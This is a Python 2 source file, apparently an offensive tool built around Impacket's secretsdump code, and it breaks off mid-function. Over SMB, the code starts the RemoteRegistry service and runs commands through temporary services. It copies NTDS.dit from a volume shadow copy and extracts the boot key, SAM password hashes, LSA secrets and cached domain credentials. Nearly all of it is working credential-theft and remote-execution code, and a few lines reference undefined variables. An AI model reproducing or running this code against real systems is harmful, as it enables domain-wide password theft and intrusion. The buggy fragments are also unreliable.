#!/usr/bin/env python
'''
Libraries
'''
import base64, sys, argparse, re, subprocess, os, time, logging, signal, urllib2, cmd, ntpath, string, random, ConfigParser, hashlib, traceback, tempfile, collections
import xml.etree.ElementTree as etree
from threading import Thread, Lock, Event
from Queue import Queue
from struct import unpack, pack
try:
    import netifaces
except:
    sys.exit("[!] Install the netifaces library: pip install netifaces")
try:
    import nmap
except:
    sys.exit("[!] Install the python-nmap library: pip install python-nmap")
try:
    import netaddr
except:
    sys.exit("[!] Install the netaddr library: pip install netaddr")
try:
    from Crypto.Cipher import DES, ARC4, AES
    from Crypto.Hash import HMAC, MD4
except Exception:
    logging.critical("Warning: You don't have any crypto installed. You need PyCrypto")
    logging.critical("See http://www.pycrypto.org/")
try:
    from impacket import smbserver, version, ntlm, uuid, winregistry, smbconnection
    from impacket.smbconnection import *
    from impacket.dcerpc.v5.dcomrt import DCOMConnection
    from impacket.dcerpc.v5.dcom import wmi
    from impacket.dcerpc.v5.dtypes import NULL
    from impacket.examples import remcomsvc, serviceinstall, logger 
    from impacket.dcerpc.v5 import transport, scmr, wkst, srvs, samr, rpcrt, rrp
    from impacket.dcerpc import ndrutils, atsvc
    from impacket.dcerpc.v5.rpcrt import DCERPCException
    from impacket.nt_errors import STATUS_MORE_ENTRIES
    from impacket.structure import Structure
    from impacket.ese import ESENT_DB
    from impacket.winregistry import hexdump
    #from impacket.smbconnection import SMBConnection

except Exception as e:
    print("[!] The following error occured %s") % (e)
    sys.exit("[!] Install the necessary impacket libraries and move this script to the examples directory within it")
'''
This pre-section contains the code from the impacket libraries and examples.
This code falls under the licenses perscribed by that code distribution.
'''

'''
IMPACKET SECRETSDUMP
'''

# Structures
# Taken from http://insecurety.net/?p=768
class SAM_KEY_DATA(Structure):
    structure = (
        ('Revision','<L=0'),
        ('Length','<L=0'),
        ('Salt','16s=""'),
        ('Key','16s=""'),
        ('CheckSum','16s=""'),
        ('Reserved','<Q=0'),
    )

class DOMAIN_ACCOUNT_F(Structure):
    structure = (
        ('Revision','<L=0'),
        ('Unknown','<L=0'),
        ('CreationTime','<Q=0'),
        ('DomainModifiedCount','<Q=0'),
        ('MaxPasswordAge','<Q=0'),
        ('MinPasswordAge','<Q=0'),
        ('ForceLogoff','<Q=0'),
        ('LockoutDuration','<Q=0'),
        ('LockoutObservationWindow','<Q=0'),
        ('ModifiedCountAtLastPromotion','<Q=0'),
        ('NextRid','<L=0'),
        ('PasswordProperties','<L=0'),
        ('MinPasswordLength','<H=0'),
        ('PasswordHistoryLength','<H=0'),
        ('LockoutThreshold','<H=0'),
        ('Unknown2','<H=0'),
        ('ServerState','<L=0'),
        ('ServerRole','<H=0'),
        ('UasCompatibilityRequired','<H=0'),
        ('Unknown3','<Q=0'),
        ('Key0',':', SAM_KEY_DATA),
# Commenting this, not needed and not present on Windows 2000 SP0
#        ('Key1',':', SAM_KEY_DATA),
#        ('Unknown4','<L=0'),
    )

# Great help from here http://www.beginningtoseethelight.org/ntsecurity/index.htm
class USER_ACCOUNT_V(Structure):
    structure = (
        ('Unknown','12s=""'),
        ('NameOffset','<L=0'),
        ('NameLength','<L=0'),
        ('Unknown2','<L=0'),
        ('FullNameOffset','<L=0'),
        ('FullNameLength','<L=0'),
        ('Unknown3','<L=0'),
        ('CommentOffset','<L=0'),
        ('CommentLength','<L=0'),
        ('Unknown3','<L=0'),
        ('UserCommentOffset','<L=0'),
        ('UserCommentLength','<L=0'),
        ('Unknown4','<L=0'),
        ('Unknown5','12s=""'),
        ('HomeDirOffset','<L=0'),
        ('HomeDirLength','<L=0'),
        ('Unknown6','<L=0'),
        ('HomeDirConnectOffset','<L=0'),
        ('HomeDirConnectLength','<L=0'),
        ('Unknown7','<L=0'),
        ('ScriptPathOffset','<L=0'),
        ('ScriptPathLength','<L=0'),
        ('Unknown8','<L=0'),
        ('ProfilePathOffset','<L=0'),
        ('ProfilePathLength','<L=0'),
        ('Unknown9','<L=0'),
        ('WorkstationsOffset','<L=0'),
        ('WorkstationsLength','<L=0'),
        ('Unknown10','<L=0'),
        ('HoursAllowedOffset','<L=0'),
        ('HoursAllowedLength','<L=0'),
        ('Unknown11','<L=0'),
        ('Unknown12','12s=""'),
        ('LMHashOffset','<L=0'),
        ('LMHashLength','<L=0'),
        ('Unknown13','<L=0'),
        ('NTHashOffset','<L=0'),
        ('NTHashLength','<L=0'),
        ('Unknown14','<L=0'),
        ('Unknown15','24s=""'),
        ('Data',':=""'),
    )

class NL_RECORD(Structure):
    structure = (
        ('UserLength','<H=0'),
        ('DomainNameLength','<H=0'),
        ('EffectiveNameLength','<H=0'),
        ('FullNameLength','<H=0'),
        ('MetaData','52s=""'),
        ('FullDomainLength','<H=0'),
        ('Length2','<H=0'),
        ('CH','16s=""'),
        ('T','16s=""'),
        ('EncryptedData',':'),
    )


class SAMR_RPC_SID_IDENTIFIER_AUTHORITY(Structure):
    structure = (
        ('Value','6s'),
    )

class SAMR_RPC_SID(Structure):
    structure = (
        ('Revision','<B'),
        ('SubAuthorityCount','<B'),
        ('IdentifierAuthority',':',SAMR_RPC_SID_IDENTIFIER_AUTHORITY),
        ('SubLen','_-SubAuthority','self["SubAuthorityCount"]*4'),
        ('SubAuthority',':'),
    )

    def formatCanonical(self):
       ans = 'S-%d-%d' % (self['Revision'], ord(self['IdentifierAuthority']['Value'][5]))
       for i in range(self['SubAuthorityCount']):
           ans += '-%d' % ( unpack('>L',self['SubAuthority'][i*4:i*4+4])[0])
       return ans

class LSA_SECRET_BLOB(Structure):
    structure = (
        ('Length','<L=0'),
        ('Unknown','12s=""'),
        ('_Secret','_-Secret','self["Length"]'),
        ('Secret',':'),
        ('Remaining',':'),
    )

class LSA_SECRET(Structure):
    structure = (
        ('Version','<L=0'),
        ('EncKeyID','16s=""'),
        ('EncAlgorithm','<L=0'),
        ('Flags','<L=0'),
        ('EncryptedData',':'),
    )

class LSA_SECRET_XP(Structure):
    structure = (
        ('Length','<L=0'),
        ('Version','<L=0'),
        ('_Secret','_-Secret', 'self["Length"]'),
        ('Secret', ':'),
    )

# Classes
class RemoteFile():
    def __init__(self, smbConnection, fileName):
        self.__smbConnection = smbConnection
        self.__fileName = fileName
        self.__tid = self.__smbConnection.connectTree('ADMIN$')
        self.__fid = None
        self.__currentOffset = 0

    def open(self):
        self.__fid = self.__smbConnection.openFile(self.__tid, self.__fileName)

    def seek(self, offset, whence):
        # Implement whence, for now it's always from the beginning of the file
        if whence == 0:
            self.__currentOffset = offset

    def read(self, bytesToRead):
        if bytesToRead > 0:
            data =  self.__smbConnection.readFile(self.__tid, self.__fid, self.__currentOffset, bytesToRead)
            self.__currentOffset += len(data)
            return data
        return ''

    def close(self):
        if self.__fid is not None:
            self.__smbConnection.closeFile(self.__tid, self.__fid)
            self.__smbConnection.deleteFile('ADMIN$', self.__fileName)
            self.__fid = None

    def tell(self):
        return self.__currentOffset

    def __str__(self):
        return "\\\\%s\\ADMIN$\\%s" % (self.__smbConnection.getRemoteHost(), self.__fileName)


class RemoteOperations:
    def __init__(self, smbConnection):
        self.__smbConnection = smbConnection
        self.__smbConnection.setTimeout(5*60)
        self.__serviceName = 'RemoteRegistry'
        self.__stringBindingWinReg = r'ncacn_np:445[\pipe\winreg]'
        self.__stringBindingSvcCtl = r'ncacn_np:445[\pipe\svcctl]'
        self.__rrp = None
        self.__bootKey = ''
        self.__disabled = False
        self.__shouldStop = False
        self.__started = False
        self.__scmr = None
        self.__regHandle = None
        self.__batchFile = '%TEMP%\\execute.bat'
        self.__shell = '%COMSPEC% /Q /c '
        self.__output = '%SYSTEMROOT%\\Temp\\__output'
        self.__answerTMP = ''
        self.__tmpServiceName = None
        self.__serviceDeleted = False

    def __connectSvcCtl(self):
        rpc = transport.DCERPCTransportFactory(self.__stringBindingSvcCtl)
        rpc.set_smb_connection(self.__smbConnection)
        self.__scmr = rpc.get_dce_rpc()
        self.__scmr.connect()
        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)

    def __connectWinReg(self):
        rpc = transport.DCERPCTransportFactory(self.__stringBindingWinReg)
        rpc.set_smb_connection(self.__smbConnection)
        self.__rrp = rpc.get_dce_rpc()
        self.__rrp.connect()
        self.__rrp.bind(rrp.MSRPC_UUID_RRP)

    def getMachineNameAndDomain(self):
        if self.__smbConnection.getServerName() == '':
            # No serverName.. this is either because we're doing Kerberos
            # or not receiving that data during the login process.
            # Let's try getting it through RPC
            rpc = transport.DCERPCTransportFactory(r'ncacn_np:445[\pipe\wkssvc]')
            rpc.set_smb_connection(self.__smbConnection)
            dce = rpc.get_dce_rpc()
            dce.connect()
            dce.bind(wkst.MSRPC_UUID_WKST)
            resp = wkst.hNetrWkstaGetInfo(dce, 100)
            dce.disconnect()
            return resp['WkstaInfo']['WkstaInfo100']['wki100_computername'][:-1], resp['WkstaInfo']['WkstaInfo100']['wki100_langroup'][:-1]
        else:
            return self.__smbConnection.getServerName(), self.__smbConnection.getServerDomain()

    def getDefaultLoginAccount(self):
        try:
            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon')
            keyHandle = ans['phkResult']
            dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'DefaultUserName')
            username = dataValue[:-1]
            dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, 'DefaultDomainName')
            domain = dataValue[:-1]
            rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
            if len(domain) > 0:
                return '%s\\%s' % (domain,username)
            else:
                return username
        except Exception, e:
            return None

    def getServiceAccount(self, serviceName):
        try:
            # Open the service
            ans = scmr.hROpenServiceW(self.__scmr, self.__scManagerHandle, serviceName)
            serviceHandle = ans['lpServiceHandle']
            resp = scmr.hRQueryServiceConfigW(self.__scmr, serviceHandle)
            account = resp['lpServiceConfig']['lpServiceStartName'][:-1]
            scmr.hRCloseServiceHandle(self.__scmr, serviceHandle)
            if account.startswith('.\\'):
                account = account[2:]
            return account
        except Exception, e:
            logging.error(e)
            return None

    def __checkServiceStatus(self):
        # Open SC Manager
        ans = scmr.hROpenSCManagerW(self.__scmr)
        self.__scManagerHandle = ans['lpScHandle']
        # Now let's open the service
        ans = scmr.hROpenServiceW(self.__scmr, self.__scManagerHandle, self.__serviceName)
        self.__serviceHandle = ans['lpServiceHandle']
        # Let's check its status
        ans = scmr.hRQueryServiceStatus(self.__scmr, self.__serviceHandle)
        if ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_STOPPED:
            logging.info('Service %s is in stopped state'% self.__serviceName)
            self.__shouldStop = True
            self.__started = False
        elif ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_RUNNING:
            logging.debug('Service %s is already running'% self.__serviceName)
            self.__shouldStop = False
            self.__started  = True
        else:
            raise Exception('Unknown service state 0x%x - Aborting' % ans['CurrentState'])

        # Let's check its configuration if service is stopped, maybe it's disabled :s
        if self.__started == False:
            ans = scmr.hRQueryServiceConfigW(self.__scmr,self.__serviceHandle)
            if ans['lpServiceConfig']['dwStartType'] == 0x4:
                logging.info('Service %s is disabled, enabling it'% self.__serviceName)
                self.__disabled = True
                scmr.hRChangeServiceConfigW(self.__scmr, self.__serviceHandle, dwStartType = 0x3)
            logging.info('Starting service %s' % self.__serviceName)
            scmr.hRStartServiceW(self.__scmr,self.__serviceHandle)
            time.sleep(1)

    def enableRegistry(self):
        self.__connectSvcCtl()
        self.__checkServiceStatus()
        self.__connectWinReg()

    def __restore(self):
        # First of all stop the service if it was originally stopped
        if self.__shouldStop is True:
            logging.info('Stopping service %s' % self.__serviceName)
            scmr.hRControlService(self.__scmr, self.__serviceHandle, scmr.SERVICE_CONTROL_STOP)
        if self.__disabled is True:
            logging.info('Restoring the disabled state for service %s' % self.__serviceName)
            scmr.hRChangeServiceConfigW(self.__scmr, self.__serviceHandle, dwStartType = 0x4)
        if self.__serviceDeleted is False:
            # Check again the service we created does not exist, starting a new connection
            # Why?.. Hitting CTRL+C might break the whole existing DCE connection
            try:
                rpc = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\svcctl]' % self.__smbConnection.getRemoteHost())
                if hasattr(rpc, 'set_credentials'):
                    # This method exists only for selected protocol sequences.
                    rpc.set_credentials(*self.__smbConnection.getCredentials())
                self.__scmr = rpc.get_dce_rpc()
                self.__scmr.connect()
                self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
                # Open SC Manager
                ans = scmr.hROpenSCManagerW(self.__scmr)
                self.__scManagerHandle = ans['lpScHandle']
                # Now let's open the service
                scmr.hROpenServiceW(self.__scmr, self.__scManagerHandle, self.__tmpServiceName)
                service = resp['lpServiceHandle']
                scmr.hRDeleteService(self.__scmr, service)
                scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
                scmr.hRCloseServiceHandle(self.__scmr, service)
                scmr.hRCloseServiceHandle(self.__scmr, self.__serviceHandle)
                scmr.hRCloseServiceHandle(self.__scmr, self.__scManagerHandle)
                rpc.disconnect()
            except Exception, e:
                # If service is stopped it'll trigger an exception
                # If service does not exist it'll trigger an exception
                # So. we just wanna be sure we delete it, no need to
                # show this exception message
                pass

    def finish(self):
        self.__restore()
        self.__rrp.disconnect()
        self.__scmr.disconnect()

    def getBootKey(self):
        bootKey = ''
        ans = rrp.hOpenLocalMachine(self.__rrp)
        self.__regHandle = ans['phKey']
        for key in ['JD','Skew1','GBG','Data']:
            logging.debug('Retrieving class info for %s'% key)
            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Control\\Lsa\\%s' % key)
            keyHandle = ans['phkResult']
            ans = rrp.hBaseRegQueryInfoKey(self.__rrp,keyHandle)
            bootKey = bootKey + ans['lpClassOut'][:-1]
            rrp.hBaseRegCloseKey(self.__rrp, keyHandle)

        transforms = [ 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 ]

        bootKey = bootKey.decode('hex')

        for i in xrange(len(bootKey)):
            self.__bootKey += bootKey[transforms[i]]

        logging.info('Target system bootKey: 0x%s' % self.__bootKey.encode('hex'))

        return self.__bootKey

    def checkNoLMHashPolicy(self):
        logging.debug('Checking NoLMHash Policy')
        ans = rrp.hOpenLocalMachine(self.__rrp)
        self.__regHandle = ans['phKey']

        ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Control\\Lsa')
        keyHandle = ans['phkResult']
        try:
            dataType, noLMHash = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'NoLmHash')
        except:
            noLMHash = 0

        if noLMHash != 1:
            logging.debug('LMHashes are being stored')
            return False

        logging.debug('LMHashes are NOT being stored')
        return True

    def __retrieveHive(self, hiveName):
        tmpFileName = ''.join([random.choice(string.letters) for i in range(8)]) + '.tmp'
        ans = rrp.hOpenLocalMachine(self.__rrp)
        regHandle = ans['phKey']
        try:
            ans = rrp.hBaseRegCreateKey(self.__rrp, regHandle, hiveName)
        except:
            raise Exception("Can't open %s hive" % hiveName)
        keyHandle = ans['phkResult']
        resp = rrp.hBaseRegSaveKey(self.__rrp, keyHandle, tmpFileName)
        rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
        rrp.hBaseRegCloseKey(self.__rrp, regHandle)
        # Now let's open the remote file, so it can be read later
        remoteFileName = RemoteFile(self.__smbConnection, 'SYSTEM32\\'+tmpFileName)
        return remoteFileName

    def saveSAM(self):
        logging.debug('Saving remote SAM database')
        return self.__retrieveHive('SAM')

    def saveSECURITY(self):
        logging.debug('Saving remote SECURITY database')
        return self.__retrieveHive('SECURITY')

    def __executeRemote(self, data):
        self.__tmpServiceName = ''.join([random.choice(string.letters) for i in range(8)]).encode('utf-16le')
        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' > ' + self.__batchFile + ' & ' + self.__shell + self.__batchFile
        command += ' & ' + 'del ' + self.__batchFile

        self.__serviceDeleted = False
        resp = scmr.hRCreateServiceW(self.__scmr, self.__scManagerHandle, self.__tmpServiceName, self.__tmpServiceName, lpBinaryPathName=command)
        service = resp['lpServiceHandle']
        try:
           scmr.hRStartServiceW(self.__scmr, service)
        except:
           pass
        scmr.hRDeleteService(self.__scmr, service)
        self.__serviceDeleted = True
        scmr.hRCloseServiceHandle(self.__scmr, service)
    def __answer(self, data):
        self.__answerTMP += data

    def __getLastVSS(self):
        self.__executeRemote('%COMSPEC% /C vssadmin list shadows')
        time.sleep(5)
        tries = 0
        while True:
            try:
                self.__smbConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
                break
            except Exception, e:
                if tries > 30:
                    # We give up
                    raise Exception('Too many tries trying to list vss shadows')
                if str(e).find('SHARING') > 0:
                    # Stuff didn't finish yet.. wait more
                    time.sleep(5)
                    tries +=1
                    pass
                else:
                    raise

        lines = self.__answerTMP.split('\n')
        lastShadow = ''
        lastShadowFor = ''

        # Let's find the last one
        # The string used to search the shadow for drive. Wondering what happens
        # in other languages
        SHADOWFOR = 'Volume: ('

        for line in lines:
           if line.find('GLOBALROOT') > 0:
               lastShadow = line[line.find('\\\\?'):][:-1]
           elif line.find(SHADOWFOR) > 0:
               lastShadowFor = line[line.find(SHADOWFOR)+len(SHADOWFOR):][:2]

        self.__smbConnection.deleteFile('ADMIN$', 'Temp\\__output')

        return lastShadow, lastShadowFor

    def saveNTDS(self):
        logging.info('Searching for NTDS.dit')
        # First of all, let's try to read the target NTDS.dit registry entry
        ans = rrp.hOpenLocalMachine(self.__rrp)
        regHandle = ans['phKey']
        try:
            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters')
            keyHandle = ans['phkResult']
        except:
            # Can't open the registry path, assuming no NTDS on the other end
            return None

        try:
            dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'DSA Database file')
            ntdsLocation = dataValue[:-1]
            ntdsDrive = ntdsLocation[:2]
        except:
            # Can't open the registry path, assuming no NTDS on the other end
            return None

        rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
        rrp.hBaseRegCloseKey(self.__rrp, regHandle)

        logging.info('Registry says NTDS.dit is at %s. Calling vssadmin to get a copy. This might take some time' % (ntdsLocation))
        # Get the list of remote shadows
        shadow, shadowFor = self.__getLastVSS()
        if shadow == '' or (shadow != '' and shadowFor != ntdsDrive):
            # No shadow, create one
            self.__executeRemote('%%COMSPEC%% /C vssadmin create shadow /For=%s' % ntdsDrive)
            shadow, shadowFor = self.__getLastVSS()
            shouldRemove = True
            if shadow == '':
                raise Exception('Could not get a VSS')
        else:
            shouldRemove = False

        # Now copy the ntds.dit to the temp directory
        tmpFileName = ''.join([random.choice(string.letters) for i in range(8)]) + '.tmp'

        self.__executeRemote('%%COMSPEC%% /C copy %s%s %%SYSTEMROOT%%\\Temp\\%s' % (shadow, ntdsLocation[2:], tmpFileName))

        if shouldRemove is True:
            self.__executeRemote('%%COMSPEC%% /C vssadmin delete shadows /For=%s /Quiet' % ntdsDrive)

        self.__smbConnection.deleteFile('ADMIN$', 'Temp\\__output')

        remoteFileName = RemoteFile(self.__smbConnection, 'Temp\\%s' % tmpFileName)

        return remoteFileName

class CryptoCommon:
    # Common crypto stuff used over different classes
    def transformKey(self, InputKey):
        # Section 2.2.11.1.2 Encrypting a 64-Bit Block with a 7-Byte Key
        OutputKey = []
        OutputKey.append( chr(ord(InputKey[0]) >> 0x01) )
        OutputKey.append( chr(((ord(InputKey[0])&0x01)<<6) | (ord(InputKey[1])>>2)) )
        OutputKey.append( chr(((ord(InputKey[1])&0x03)<<5) | (ord(InputKey[2])>>3)) )
        OutputKey.append( chr(((ord(InputKey[2])&0x07)<<4) | (ord(InputKey[3])>>4)) )
        OutputKey.append( chr(((ord(InputKey[3])&0x0F)<<3) | (ord(InputKey[4])>>5)) )
        OutputKey.append( chr(((ord(InputKey[4])&0x1F)<<2) | (ord(InputKey[5])>>6)) )
        OutputKey.append( chr(((ord(InputKey[5])&0x3F)<<1) | (ord(InputKey[6])>>7)) )
        OutputKey.append( chr(ord(InputKey[6]) & 0x7F) )

        for i in range(8):
            OutputKey[i] = chr((ord(OutputKey[i]) << 1) & 0xfe)

        return "".join(OutputKey)

    def deriveKey(self, baseKey):
        # 2.2.11.1.3 Deriving Key1 and Key2 from a Little-Endian, Unsigned Integer Key
        # Let I be the little-endian, unsigned integer.
        # Let I[X] be the Xth byte of I, where I is interpreted as a zero-base-index array of bytes.
        # Note that because I is in little-endian byte order, I[0] is the least significant byte.
        # Key1 is a concatenation of the following values: I[0], I[1], I[2], I[3], I[0], I[1], I[2].
        # Key2 is a concatenation of the following values: I[3], I[0], I[1], I[2], I[3], I[0], I[1]
        key = pack('<L',baseKey)
        key1 = key[0] + key[1] + key[2] + key[3] + key[0] + key[1] + key[2]
        key2 = key[3] + key[0] + key[1] + key[2] + key[3] + key[0] + key[1]
        return self.transformKey(key1),self.transformKey(key2)


class OfflineRegistry:
    def __init__(self, hiveFile = None, isRemote = False):
        self.__hiveFile = hiveFile
        if self.__hiveFile is not None:
            self.__registryHive = winregistry.Registry(self.__hiveFile, isRemote)

    def enumKey(self, searchKey):
        parentKey = self.__registryHive.findKey(searchKey)

        if parentKey is None:
            return

        keys = self.__registryHive.enumKey(parentKey)

        return keys

    def enumValues(self, searchKey):
        key = self.__registryHive.findKey(searchKey)

        if key is None:
            return

        values = self.__registryHive.enumValues(key)

        return values

    def getValue(self, keyValue):
        value = self.__registryHive.getValue(keyValue)

        if value is None:
            return

        return value

    def getClass(self, className):
        value = self.__registryHive.getClass(className)

        if value is None:
            return

        return value

    def finish(self):
        if self.__hiveFile is not None:
            # Remove temp file and whatever else is needed
            self.__registryHive.close()

class SAMHashes(OfflineRegistry):
    def __init__(self, samFile, bootKey, isRemote = False):
        OfflineRegistry.__init__(self, samFile, isRemote)
        self.__samFile = samFile
        self.__hashedBootKey = ''
        self.__bootKey = bootKey
        self.__cryptoCommon = CryptoCommon()
        self.__itemsFound = {}

    def MD5(self, data):
        md5 = hashlib.new('md5')
        md5.update(data)
        return md5.digest()

    def getHBootKey(self):
        logging.debug('Calculating HashedBootKey from SAM')
        QWERTY = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"
        DIGITS = "0123456789012345678901234567890123456789\0"

        F = self.getValue(ntpath.join('SAM\Domains\Account','F'))[1]

        domainData = DOMAIN_ACCOUNT_F(F)

        rc4Key = self.MD5(domainData['Key0']['Salt'] + QWERTY + self.__bootKey + DIGITS)

        rc4 = ARC4.new(rc4Key)
        self.__hashedBootKey = rc4.encrypt(domainData['Key0']['Key']+domainData['Key0']['CheckSum'])

        # Verify key with checksum
        checkSum = self.MD5( self.__hashedBootKey[:16] + DIGITS + self.__hashedBootKey[:16] + QWERTY)

        if checkSum != self.__hashedBootKey[16:]:
            raise Exception('hashedBootKey CheckSum failed, Syskey startup password probably in use! :(')

    def __decryptHash(self, rid, cryptedHash, constant):
        # Section 2.2.11.1.1 Encrypting an NT or LM Hash Value with a Specified Key
        # plus hashedBootKey stuff
        Key1,Key2 = self.__cryptoCommon.deriveKey(rid)

        Crypt1 = DES.new(Key1, DES.MODE_ECB)
        Crypt2 = DES.new(Key2, DES.MODE_ECB)

        rc4Key = self.MD5( self.__hashedBootKey[:0x10] + pack("<L",rid) + constant )
        rc4 = ARC4.new(rc4Key)
        key = rc4.encrypt(cryptedHash)

        decryptedHash = Crypt1.decrypt(key[:8]) + Crypt2.decrypt(key[8:])

        return decryptedHash

    def dump(self):
        NTPASSWORD = "NTPASSWORD\0"
        LMPASSWORD = "LMPASSWORD\0"

        if self.__samFile is None:
            # No SAM file provided
            return

        logging.info('Dumping local SAM hashes (uid:rid:lmhash:nthash)')
        self.getHBootKey()

        usersKey = 'SAM\\Domains\\Account\\Users'

        # Enumerate all the RIDs
        rids = self.enumKey(usersKey)
        # Remove the Names item
        try:
            rids.remove('Names')
        except:
            pass

        for rid in rids:
            userAccount = USER_ACCOUNT_V(self.getValue(ntpath.join(usersKey,rid,'V'))[1])
            rid = int(rid,16)

            baseOffset = len(USER_ACCOUNT_V())

            V = userAccount['Data']

            userName = V[userAccount['NameOffset']:userAccount['NameOffset']+userAccount['NameLength']].decode('utf-16le')

            if userAccount['LMHashLength'] == 20:
                encLMHash = V[userAccount['LMHashOffset']+4:userAccount['LMHashOffset']+userAccount['LMHashLength']]
            else:
                encLMHash = ''

            if userAccount['NTHashLength'] == 20:
                encNTHash = V[userAccount['NTHashOffset']+4:userAccount['NTHashOffset']+userAccount['NTHashLength']]
            else:
                encNTHash = ''

            lmHash = self.__decryptHash(rid, encLMHash, LMPASSWORD)
            ntHash = self.__decryptHash(rid, encNTHash, NTPASSWORD)

            if lmHash == '':
                lmHash = ntlm.LMOWFv1('','')
            if ntHash == '':
                ntHash = ntlm.NTOWFv1('','')

            answer =  "%s:%d:%s:%s:::" % (userName, rid, lmHash.encode('hex'), ntHash.encode('hex'))
            self.__itemsFound[rid] = answer
            print answer

    def export(self, fileName):
        if len(self.__itemsFound) > 0:
            items = sorted(self.__itemsFound)
            fd = open(fileName+'.sam','w+')
            for item in items:
                fd.write(self.__itemsFound[item]+'\n')
            fd.close()


class LSASecrets(OfflineRegistry):
    def __init__(self, securityFile, bootKey, remoteOps = None, isRemote = False):
        OfflineRegistry.__init__(self,securityFile, isRemote)
        self.__hashedBootKey = ''
        self.__bootKey = bootKey
        self.__LSAKey = ''
        self.__NKLMKey = ''
        self.__isRemote = isRemote
        self.__vistaStyle = True
        self.__cryptoCommon = CryptoCommon()
        self.__securityFile = securityFile
        self.__remoteOps = remoteOps
        self.__cachedItems = []
        self.__secretItems = []

    def MD5(self, data):
        md5 = hashlib.new('md5')
        md5.update(data)
        return md5.digest()

    def __sha256(self, key, value, rounds=1000):
        sha = hashlib.sha256()
        sha.update(key)
        for i in range(1000):
            sha.update(value)
        return sha.digest()

    def __decryptAES(self, key, value, iv='\x00'*16):
        plainText = ''
        if iv != '\x00'*16:
            aes256 = AES.new(key,AES.MODE_CBC, iv)

        for index in range(0, len(value), 16):
            if iv == '\x00'*16:
                aes256 = AES.new(key,AES.MODE_CBC, iv)
            cipherBuffer = value[index:index+16]
            # Pad buffer to 16 bytes
            if len(cipherBuffer) < 16:
                cipherBuffer += '\x00' * (16-len(cipherBuffer))
            plainText += aes256.decrypt(cipherBuffer)

        return plainText

    def __decryptSecret(self, key, value):
        # [MS-LSAD] Section 5.1.2
        plainText = ''

        encryptedSecretSize = unpack('<I', value[:4])[0]
        value = value[len(value)-encryptedSecretSize:]

        key0 = key
        for i in range(0, len(value), 8):
            cipherText = value[:8]
            tmpStrKey = key0[:7]
            tmpKey = self.__cryptoCommon.transformKey(tmpStrKey)
            Crypt1 = DES.new(tmpKey, DES.MODE_ECB)
            plainText += Crypt1.decrypt(cipherText)
            cipherText = cipherText[8:]
            key0 = key0[7:]
            value = value[8:]
            # AdvanceKey
            if len(key0) < 7:
                key0 = key[len(key0):]

        secret = LSA_SECRET_XP(plainText)
        return (secret['Secret'])

    def __decryptHash(self, key, value, iv):
        hmac_md5 = HMAC.new(key,iv)
        rc4key = hmac_md5.digest()

        rc4 = ARC4.new(rc4key)
        data = rc4.encrypt(value)
        return data

    def __decryptLSA(self, value):
        if self.__vistaStyle is True:
            # ToDo: There could be more than one LSA Keys
            record = LSA_SECRET(value)
            tmpKey = self.__sha256(self.__bootKey, record['EncryptedData'][:32])
            plainText = self.__decryptAES(tmpKey, record['EncryptedData'][32:])
            record = LSA_SECRET_BLOB(plainText)
            self.__LSAKey = record['Secret'][52:][:32]

        else:
            md5 = hashlib.new('md5')
            md5.update(self.__bootKey)
            for i in range(1000):
                md5.update(value[60:76])
            tmpKey = md5.digest()
            rc4 = ARC4.new(tmpKey)
            plainText = rc4.decrypt(value[12:60])
            self.__LSAKey = plainText[0x10:0x20]

    def __getLSASecretKey(self):
        logging.debug('Decrypting LSA Key')
        # Let's try the key post XP
        value = self.getValue('\\Policy\\PolEKList\\default')
        if value is None:
            logging.debug('PolEKList not found, trying PolSecretEncryptionKey')
            # Second chance
            value = self.getValue('\\Policy\\PolSecretEncryptionKey\\default')
            self.__vistaStyle = False
            if value is None:
                # No way :(
                return None

        self.__decryptLSA(value[1])

    def __getNLKMSecret(self):
        logging.debug('Decrypting NL$KM')
        value = self.getValue('\\Policy\\Secrets\\NL$KM\\CurrVal\\default')
        if value is None:
            raise Exception("Couldn't get NL$KM value")
        if self.__vistaStyle is True:
            record = LSA_SECRET(value[1])
            tmpKey = self.__sha256(self.__LSAKey, record['EncryptedData'][:32])
            self.__NKLMKey = self.__decryptAES(tmpKey, record['EncryptedData'][32:])
        else:
            self.__NKLMKey = self.__decryptSecret(self.__LSAKey, value[1])

    def __pad(self, data):
        if (data & 0x3) > 0:
            return data + (data & 0x3)
        else:
            return data

    def dumpCachedHashes(self):
        if self.__securityFile is None:
            # No SECURITY file provided
            return

        logging.info('Dumping cached domain logon information (uid:encryptedHash:longDomain:domain)')

        # Let's first see if there are cached entries
        values = self.enumValues('\\Cache')
        if values == None:
            # No cache entries
            return
        try:
            # Remove unnecesary value
            values.remove('NL$Control')
        except:
            pass

        self.__getLSASecretKey()
        self.__getNLKMSecret()

        for value in values:
            logging.debug('Looking into %s' % value)
            record = NL_RECORD(self.getValue(ntpath.join('\\Cache',value))[1])
            if record['CH'] != 16 * '\x00':
                if self.__vistaStyle is True:
                    plainText = self.__decryptAES(self.__NKLMKey[16:32], record['EncryptedData'], record['CH'])
                else:
                    plainText = self.__decryptHash(self.__NKLMKey, record['EncryptedData'], record['CH'])
                    pass
                encHash = plainText[:0x10]
